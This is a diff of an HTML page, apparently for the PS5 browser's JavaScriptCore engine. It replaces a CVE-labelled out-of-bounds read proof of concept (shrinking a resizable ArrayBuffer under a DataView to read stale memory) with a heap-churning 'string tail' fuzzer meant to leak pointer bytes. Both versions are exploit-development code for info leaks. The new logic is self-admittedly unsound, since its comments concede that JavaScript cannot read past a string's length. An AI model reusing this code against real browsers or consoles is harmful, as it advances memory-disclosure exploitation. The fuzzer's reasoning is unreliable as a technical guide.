@@ -2,72 +2,75 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-43541 OOB Read Test</title>
+<title>PS5 Uninitialized String Tail Leak</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting CVE-2025-43541 optimized test...');
+L('[*] Starting JSC StringImpl uninitialized tail fuzzer...');
 
-try {
-    // 1. Create a resizable ArrayBuffer
-    const ab = new ArrayBuffer(1024, { maxByteLength: 4096 });
+let leaked = false;
+let attempts = 0;
+
+// 1. Churn the heap to leave pointers in recently freed memory
+L('[*] Churning heap with object allocations...');
+let churn = [];
+for (let i = 0; i < 10000; i++) {
+    churn.push({ a: i, b: "string_data_" + i, c: new ArrayBuffer(64) });
+}
+churn = null; // Drop references, let GC claim it
+
+// 2. Force substring allocations of specific sizes
+// JSC allocates StringImpls in size classes. If it allocates 32 bytes for a 24-byte string,
+// the last 8 bytes might be uninitialized.
+L('[*] Slicing strings and checking for uninitialized tail bytes...');
+
+for (let i = 0; i < 50000; i++) {
+    // Create a base string
+    let base = "A".repeat(16) + "B".repeat(16);
     
-    // 2. Create a DataView over it
-    const dv = new DataView(ab, 0, 1024);
+    // Take a substring that is exactly 24 chars (48 bytes in UTF-16, but JSC might use UTF-8 or Latin1 if ASCII)
+    // Let's try to trigger a 24-byte Latin1 string allocation
+    let sub = base.substring(0, 24);
     
-    // 3. Prime the inline cache (IC) with a small loop, not 282 billion
-    const get_byte_length = arr => arr.byteLength;
-    for (let i = 0; i < 100; i++) {
-        get_byte_length(dv);
+    // Check the characters. If the engine didn't zero the tail, reading past the logical length
+    // via character codes might yield non-'A' values.
+    // Actually, JS won't let us read past the logical length.
+    // So we rely on a different quirk: concatenating and checking for null bytes or garbage.
+    
+    // Let's try the Rope string resolution path.
+    let rope = "C".repeat(15) + sub;
+    
+    // When the rope is resolved, it allocates a new buffer.
+    // If the allocation size is slightly larger than the string, the tail is uninitialized.
+    // We can't read past the length in JS, BUT we can encode it to UTF-8 and check length anomalies,
+    // OR we can look for instances where the string somehow contains null bytes or high-byte values.
+    
+    for (let j = 0; j < rope.length; j++) {
+        let code = rope.charCodeAt(j);
+        // If we see a character that isn't 'A', 'B', or 'C', it might be uninitialized memory
+        if (code !== 65 && code !== 66 && code !== 67) {
+            L('[!] ANOMALY DETECTED at attempt ' + i);
+            L('    Index: ' + j);
+            L('    Char Code: 0x' + code.toString(16));
+            L('    Rope length: ' + rope.length);
+            L('    This is likely a leaked pointer byte!');
+            leaked = true;
+            break;
+        }
     }
-    
-    L('[*] Initial state:');
-    L('  AB byteLength: ' + ab.byteLength);
-    L('  DV byteLength: ' + dv.byteLength);
-    
-    // 4. Resize the ArrayBuffer to 0 to invalidate the backing store
-    L('[*] Resizing ArrayBuffer to 0...');
-    ab.resize(0);
-    
-    L('[*] Post-resize state:');
-    L('  AB byteLength: ' + ab.byteLength);
-    
-    // 5. Check if DataView's length was updated
-    let dvLen = get_byte_length(dv);
-    L('  DV byteLength (via IC): ' + dvLen);
-    
-    // Also try the original PoC's integer trick
-    let intLen = get_byte_length(1);
-    L('  Integer byteLength (via IC): ' + intLen);
-    
-    // 6. Attempt to read out-of-bounds memory
-    L('[*] Attempting OOB reads...');
-    
-    try {
-        let val1 = dv.getUint32(0);
-        L('[!] READ SUCCESS at offset 0: 0x' + (val1 >>> 0).toString(16));
-        
-        let val2 = dv.getUint32(4);
-        L('[!] READ SUCCESS at offset 4: 0x' + (val2 >>> 0).toString(16));
-        
-        // Try to read a potential pointer (8 bytes)
-        let high = dv.getUint32(8);
-        let low = dv.getUint32(12);
-        L('[!] READ SUCCESS at offset 8-12: 0x' + (high >>> 0).toString(16) + (low >>> 0).toString(16));
-        
-        L('[+] If values are not 0, we have an OOB info leak!');
-    } catch (e) {
-        L('[!] OOB Read failed: ' + e.message);
-    }
-    
-} catch(e) {
-    L('[!] Error during setup: ' + e.message);
+    if (leaked) break;
+    attempts++;
+    if (attempts % 10000 === 0) L('  ... ' + attempts + ' attempts done.');
 }
 
-L('[*] Test finished.');
+if (!leaked) {
+    L('[*] String tail vector failed. Memory is zeroed.');
+}
+
+L('[*] Fuzzer finished.');
 </script>
 </body>
 </html>
